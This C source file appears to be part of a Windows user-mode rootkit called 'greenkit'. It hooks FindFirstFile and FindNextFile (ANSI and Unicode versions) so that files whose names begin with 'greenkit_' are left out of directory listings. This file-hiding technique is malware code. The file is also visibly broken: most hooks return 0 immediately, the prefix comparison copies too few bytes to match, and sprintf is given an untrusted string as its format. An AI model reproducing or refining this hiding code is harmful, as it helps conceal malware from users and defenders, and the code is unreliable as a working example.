#include "stdafx.h"

#include "FindFiles.h"
#include <windows.h>
#include "hooking.h"
#include <shellapi.h>
#include <shlwapi.h>
#include <stdio.h>

const char *prefix = "greenkit_";

void path_strip_filename(TCHAR *Path) {
    size_t Len = _tcslen(Path);
    if (Len == 0) { return; };
    size_t Idx = Len - 1;
    while (TRUE) {
        TCHAR Chr = Path[Idx];
        if (Chr == TEXT('\\') || Chr == TEXT('/')) {
            if (Idx == 0 || Path[Idx - 1] == ':') { Idx++; };
            break;
        }
        else if (Chr == TEXT(':')) {
            Idx++; break;
        }
        else {
            if (Idx == 0) { break; }
            else { Idx--; };
        };
    };
    Path[Idx] = TEXT('\0');
};


//FindFirstFileA (ANSI)
//HANDLE (WINAPI *pMyFindFirstFileA)(LPCTSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
HANDLE WINAPI MyFindFirstFileA(LPCTSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData)
{
    return 0;
    char szBuffer[MAX_PATH], szFileName[MAX_PATH];
    HANDLE ret;
    ret = FindFirstFileA(lpFileName, lpFindFileData);
    sprintf(szFileName, lpFileName);
    path_strip_filename(szFileName);
    memcpy(szBuffer, szFileName, 6);
    if (lstrcmpi(szBuffer, prefix) == 0) ret = FindFirstFileA(lpFileName, lpFindFileData);
    return ret;
}

//FindNextFileA (ANSI)
//int (WINAPI *pMyFindNextFileA)(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);
int WINAPI MyFindNextFileA(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData)
{
    return 0;
    char szBuffer[MAX_PATH], szFileName[MAX_PATH];
    int ret;
    ret = FindNextFileA(hFindFile, lpFindFileData);
    sprintf(szFileName, lpFindFileData->cFileName);
    path_strip_filename(szFileName);
    memcpy(szBuffer, szFileName, 6);
    if (lstrcmpi(szBuffer, prefix) == 0) ret = FindNextFileA(hFindFile, lpFindFileData);
    return ret;
}


//FindFirstFileW (UNICODE)
//HANDLE (WINAPI *pMyFindFirstFileW)(LPCTSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData);
HANDLE WINAPI MyFindFirstFileW(LPCTSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData)
{
    return 0;
    char szBuffer[MAX_PATH] = "\0", szFileName[MAX_PATH];
    HANDLE ret;
    ret = FindFirstFileW((LPCWSTR)lpFileName, lpFindFileData);
    WideCharToMultiByte(CP_ACP, 0, lpFindFileData->cFileName, MAX_PATH, szFileName, MAX_PATH, NULL, NULL);
    path_strip_filename(szFileName);
    memcpy(szBuffer, szFileName, 6);
    if (lstrcmpi(szBuffer, prefix) == 0)
        ret = FindFirstFileW((LPCWSTR)lpFileName, lpFindFileData);
    return ret;
}

//FindNextFileW (UNICODE)
//int (WINAPI *pMyFindNextFileW)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
BOOL WINAPI MyFindNextFileW(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData)
{
    //return 0;
    char szBuffer[MAX_PATH] = "\0", szFileName[MAX_PATH];
    BOOL ret;
    //ret = FindNextFileW(hFindFile, lpFindFileData);
    ret = ((FNFW) hooking_getOldFunction("FindNextFileW"))(hFindFile, lpFindFileData);
    WideCharToMultiByte(CP_ACP, 0, lpFindFileData->cFileName, MAX_PATH, szFileName, MAX_PATH, NULL, NULL);
    path_strip_filename(szFileName);
    memcpy(szBuffer, szFileName, 6);
    if (lstrcmpi(szBuffer, prefix) == 0)
        ret = FindNextFileW(hFindFile, lpFindFileData);
    return ret;
}